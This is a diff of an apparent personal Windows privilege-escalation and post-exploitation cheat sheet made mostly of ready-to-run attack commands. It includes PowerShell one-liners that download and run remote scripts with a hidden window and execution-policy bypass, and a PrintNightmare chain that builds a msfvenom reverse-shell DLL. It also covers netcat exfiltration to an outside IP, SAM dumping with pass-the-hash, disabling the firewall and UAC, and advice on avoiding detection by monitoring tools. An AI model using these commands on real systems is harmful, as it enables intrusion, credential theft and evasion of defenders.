@@ -1,23 +1,18 @@
 # Basics
 
-## Enumeration
+DO NOT RUN `whoami`!!! Some SOARs may detect it and start tracking u!
 
-Basic Strategy
+## Automated enum
 
-1. Check `whoami` and groups with `net user <username>`
-2. `winpeas.exe quiet fast searchfast cmd`
-3. Run seatbelt and other enumeration scripts
-4. Run manual commands if needed 
-5. Look for non windows programs and services
-6. If windows version is old then try potatoes if privileges are there
-7. If nothing works use kernel exploits
+https://github.com/itm4n/PrivescCheck/
 
-* Take time to look for low hanging fruits but avoid rabbit holes: registry, services ...
-* Check files and folders looking for interesting files
-* look for internal ports
-* Check users
+The script there is obfuscated but additional levels of obfuscation are welcome.
 
-### Basic stuff to do first
+1. `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"`
+2. Run manual commands if needed 
+3. If windows version is old then try potatoes if privileges are there
+
+### Manual enum
 
 ```powershell
 
@@ -68,16 +63,6 @@ Test-NetConnection -Port 445 192.168.50.111
 
 ```
 
-### Automated check
-
-https://github.com/itm4n/PrivescCheck/
-
-Invoke all checks 
-
-```cmd
-powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
-```
-
 ### Helpful stuff
 
 ```powershell
@@ -92,26 +77,9 @@ shutdown /r /t 0
 
 # use `/pth:` for pass the hash
 
-```
-
-### Users
-
-```powershell
-
 net user
 
 Get-LocalUser
-
-whoami /all
-
-```
-
-
-### Groups
-
-```powershell
-
-whoami /groups
 
 # get list of local groups
 Get-LocalGroup
@@ -122,11 +90,6 @@ net localgroup
 Get-LocalGroupMember SomeGroup
 
 net localgroup SomeGroup
-```
-
-### Installed Application
-
-```powershell
 
 # cmd
 
@@ -144,14 +107,6 @@ Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Un
 # 64 bit
 
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-```
-
-Then look for vulnerable applications that are running.
-
-### Find Process and its ACL
-
-```powershell
-
 
 Get-Process | Select-Object ProcessName, Path
 
@@ -160,10 +115,7 @@ Get-Process -Name | Get-Acl
 Get-Process | ForEach-Object { $_.Path } 
 
 
-
 ```
-
-Process ID can be then correlated with what is installed and exposed.
 
 ### NetBIOS
 
@@ -173,9 +125,9 @@ NetBIOS Name is a 16-byte name for a networking service or function on a machine
 
 * remote scan: `sudo nmap -sU --script nbstat.nse -p137 <host>`
 
-### Support Tools
+### PowerSploit
 
-* PowerSploit is extramely useful in general for all kind of windows pentesting
+* PowerSploit is extramely useful for actions on objective after reconaissance with `Privesc`
 * Each single Module can accessed as so after hosting the directory
 * for more info see: https://resources.infosecinstitute.com/topic/powershell-toolkit-powersploit/
 
@@ -201,8 +153,7 @@ windows/meterpreter/reverse_https
 
 
 
-## UAC
-
+## UAC bypass
 
 * check UAC in cmd: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
 
@@ -223,16 +174,17 @@ Register-ScheduledTask -TaskName "DisableUAC" -Action $action -Trigger $trigger 
 
 ```
 
-# Antivirus
+## Antivirus bypass
 
-## Detect AV Version
+### Detect AV Version
 
 * works with PS 3.0 and higher
 Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
 
+### TBD bypass 
+
+
 ## Download and Upload stuff
-
-
 
 ```powershell
 
@@ -260,7 +212,6 @@ net use \\server /user:domain\username password
 
  & \\192.168.119.169\tools\Rubeus.exe triage
 
-
 ```
 
 
@@ -278,6 +229,7 @@ use netcat
 `cmd.exe /C "nc64.exe 192.168.219.137 443 < systeminfo.txt"`
 
 * Powershell
+
 ```
 #run receiver on listener
 
@@ -290,9 +242,24 @@ Get-Content file.xxx | .\nc.exe IP PORT
 Set-ExecutionPolicy Unrestricted
 ```
 
+```powershell
+# For older Systems use Sherlock
+powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"
 
+powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1'); Invoke-AllChecks"
+
+```
 
 ## Find Stuff
+
+Look for passwords
+
+`dir /s *pass* == *.config`
+
+If found then search in the directory for strings within files
+
+`findstr /si password *.xml *.ini *.txt`
+
 
 * Primary option: PowerView.ps1
 
@@ -319,7 +286,18 @@ In the users folder look for more extensions
 Get-ChildItem -Path .\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-### DPAPI
+### Recycle Bin // TBD
+
+* access recycle bin items
+
+```
+$shell = New-Object -com shell.application
+$rb = $shell.Namespace(10)
+$rb.Items()
+```
+
+
+## DPAPI
 
 Or just use `https://github.com/login-securite/DonPAPI`
 
@@ -353,45 +331,12 @@ Everything is easy if you are local admin
 `sekurlsa::dpapi`
 
 
-## Recycle Bin // TBD
-
-* access recycle bin items
-
-```
-$shell = New-Object -com shell.application
-$rb = $shell.Namespace(10)
-$rb.Items()
-```
-
-## Enumeration
-
-### local enumeration
-
-* Winpeas
-
-Optional: activate this command to see colours in a new command prompt
-
-```cmd
-
-REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
-
-```
-
-* Start `winpeas.exe` on victim in Temp folder
-* Different checks can be also checked separately like `winpeas.exe userinfo`
 
 
-* Older systems
 
-```powershell
-# For older Systems use Sherlock
-powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"
+## Services
 
-powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1'); Invoke-AllChecks"
-
-```
-
-### User Access Control rights check
+### Access Control check
 
 UAC rights show if the user can read or write files.
 
@@ -404,9 +349,7 @@ Check access
 `.\accesschk.exe /accepteula -uwcqv user c:\`
 
 
-### Services
-
-#### Insecure Service Properties
+### Insecure Service Properties
 
 Dangerous permissions: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
 
@@ -455,7 +398,7 @@ RABBIT HOLE: Make sure you can restart the service or machine to make changes ac
 
 `accesschk.exe /accepteula -ucqv servicename`
 
-#### Unquoted Service Path
+## Unquoted Service Path
 
 ```cmd
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
@@ -472,7 +415,7 @@ IEX(New-Object Net.WebClient).downloadString('http://192.168.45.xxx:8080/ChkUnqP
 ```
 
 
-#### Weak Registry Permissions
+## Weak Registry Permissions
 
 First, check
 
@@ -530,9 +473,9 @@ Now just start the service again and await reverse shell.
 
 
 
-#### Hijacking
+## Hijacking
 
-##### Binary
+### Binary
 
 1. Find running services
 
@@ -613,7 +556,7 @@ Get-ChildItem C:\temp\ -Recurse | Get-Acl
 
 3. create malicious msi rev shell `-f msi` and execute it on victim
 
-##### DLL
+## DLL hijacking
 
 1. Identify missing DLL using procmon
 2. crorss-compile malicious dll and place in working folder
@@ -665,9 +608,9 @@ DLL is going to be searched by OS in following order.
 ```
 
 
-### Passwords compromise
+## Passwords compromise
 
-#### Passwords in Registry
+### Passwords in Registry
 
 Run winpeas
 
@@ -689,7 +632,7 @@ reg query "HKLM\Software\...\winlogon"
 
 ```
 
-#### RunAs Saved Creds
+## RunAs Saved Creds
 
 Discover `winpeas.exe quiet cmd windowscreds`
 
@@ -699,19 +642,10 @@ Exploit:
 
 `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
 
-#### Search files for information
-
-Look for passwords
-
-`dir /s *pass* == *.config`
-
-If found then search in the directory for strings within files
-
-`findstr /si password *.xml *.ini *.txt`
 
 
 
-#### dump password hashes
+## dump password hashes
 
 
 reg save HKLM\SAM C:\wamp64\attendance\images\test\SAM
@@ -741,7 +675,7 @@ OR even better login directly win pth-winexe
 pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' --system //192.168.111.xxx cmd.exe
 ```
 
-#### Scheduled Tasks compromise
+## Scheduled Tasks compromise
 
 * Discovery
 
@@ -766,7 +700,7 @@ icacls C:\Users\user101\Cleanup.exe
 
 * Wait until task executes
 
-#### Insecure GUI Apps
+## Insecure GUI Apps
 
 * find an app with GUI file access ran by admin
 
@@ -778,7 +712,7 @@ tasklist /V | findstr admin_GUI.exe
 
 * once found that app, click on "Open File..." and type in the navigation bar on top of the window `file://c:/windows/system32/cmd.exe`
 
-#### Startup Folder compromise
+## Startup Folder compromise
 
 * System startup folder is located in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` and if shortcut .lnk is place wihin then program linked shall autostart at reboot.
 
@@ -797,13 +731,13 @@ oLink.Save
 * Activate this script `cscript create_shortcut.vbs`
 * Wait for admin
 
-#### Non MS Apps exploitation
+## Non MS Apps exploitation
 
 * On ExploitDB select `Windows -> Apps -> Privesc -> Has App`
 * Look for possbible vulnerable apps using `seatbelt.exe` on victim or `tasklist /V` or `winpeas.exe quiet processinfo`
 * find the exploit on `exploit.db` as shown above
 
-#### User impersonation
+## User impersonation
 
 ```powershell
 ## SU ON WINDOWS = runas
@@ -824,11 +758,7 @@ Start-Process powershell.exe -Credential $credential
 
 ```
 
-### Abusing Privileges
-
-https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
-
-#### Token Impersonation
+## Token Impersonation
 
 Use potatoes wisely
 
@@ -863,7 +793,32 @@ impersonate_token domain\\username
 
 ```
 
-##### PrintSpoofer
+## PrintSpoofer
+
+Find vulenrable RPC
+
+`rpcdump.py <HOST-IP>  | grep -A 6 MS-RPRN`
+
+or 
+
+```bash
+# Check open pipes
+rpcdump.py <HOST-IP> | egrep 'MS-RPRN|MS-PAR'
+
+# Create a DLL payload (reverse shell in this example)
+msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -o /workspace/smb/remote.dll
+
+# Host a SMB share 
+smbserver.py -smb2support "WHATEVERNAME" /workspace/smb/
+
+# Start the listener (for the reverse shell)
+nc -lvnp $LOCAL_PORT
+
+# Run the exploit
+CVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\$LOCAL_IP\$SHARE\remote.dll'
+
+#thanks 2 https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare
+```
 
 Windows Version 1607 onwards
 
@@ -878,9 +833,11 @@ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32
 
 
 
-### Certificate exploits
+# Certificate exploits
 
-* PKI might badly configured
+UPDATE: better use `https://github.com/ly4k/Certipy`
+
+* PKI might be badly configured
 * exploit it using Certify.exe tool for recon and certificate forging
 
 ```bash
@@ -907,7 +864,7 @@ impacket-psexe -no-pass -k target cmd
 
 ```
 
-### Kernel Exploits
+## Kernel Exploits
 
 * User Kernel only as last resort to Windows PrivEsc
 
@@ -937,19 +894,7 @@ c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke
 
 3. Watson for older systems
 
-## remote enumeration
-
-* enum4linux
-* nmap scripts
-* crackmapexec
-
-#### well know exploits
-
-* PrinterNightmare: https://github.com/calebstewart/CVE-2021-1675/tree/main
-* Potatoes: SeImpersonate
-* ...
-
-### RPC
+## RPC
 
 * Dump services
 
@@ -958,7 +903,7 @@ c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke
 * Map RPC service
 `impacket-rpcmap -no-pass -target-ip TARGET_IP ncacn_np:\\JEFF[\PIPE\atsvc]`
 
-### wmic 
+## wmic 
 
 * If you got creds and WMI is open on the target (only older machines), gain RCE using wmic on win host locally
 
@@ -992,7 +937,7 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
 
 ```
 
-### WinRM
+## WinRM
 
 * attack from local  host
 
@@ -1009,7 +954,7 @@ New-PSSession -ComputerName 192.168.xx.xx -Credential $credential
 ```
 
 
-### Meterpreter
+## Meterpreter
 This shell works even on Windows 11 but needs MSF
 
 1. SMB delivery: `use windows/smb/smb/delivery`
@@ -1018,22 +963,6 @@ This shell works even on Windows 11 but needs MSF
 4. During exploit execution MSF will ask you to run following on target machine: `rundll32.exe \\attacker_ip\PJSK\test.dll,0`
 5. Select active session
 6. Get shell: `shell`
-
-
-## Privelege Escalation
-
-
-### Kernel exploits
-
-see https://github.com/jonnyzar/windows-kernel-exploits
-
-`wes.py systeminfo.txt`
-
-## Standard Approach
-* Download Winpeas: see github
-* Follow HackTricks: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
-* If it does not help, go for advances techniques
-
 
 
 ## Exposed GPP Password
@@ -1056,8 +985,6 @@ i686-w64-mingw32-gcc shell.c -o shell.exe
 ```
 
 
-
-
 ## Use winexe
 
 In kali there is winexe tool that allows running remote commands on windows
@@ -1077,7 +1004,7 @@ winexe -U 'admin%password123' --system //192.168.1.xxx cmd.exe
 * now  use any tools and target `127.0.0.1:445` on kali machine like `winexe`
 
 
-# Firewall
+## Firewall tricks
 
 * Shut off firewall
 `netsh advfirewall set allprofiles state off`
@@ -1086,13 +1013,6 @@ winexe -U 'admin%password123' --system //192.168.1.xxx cmd.exe
 
 `Get-NetFirewallRule`
 
-Or more refinded
-
-```
-Direction Outbound - limit to outbound rules since that’s where I’m having issues
-Action Block - limit to rules that block traffic
-Enabled True - don’t show the large set of rules that are present but not enabled
-```
 
 * Get firewall rules for blocking outbound
 
@@ -1115,11 +1035,6 @@ Action"
 powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
 
 ```
-
-
-
-### Encoded Powershell Execution
-
 
 
 ## MSSQL
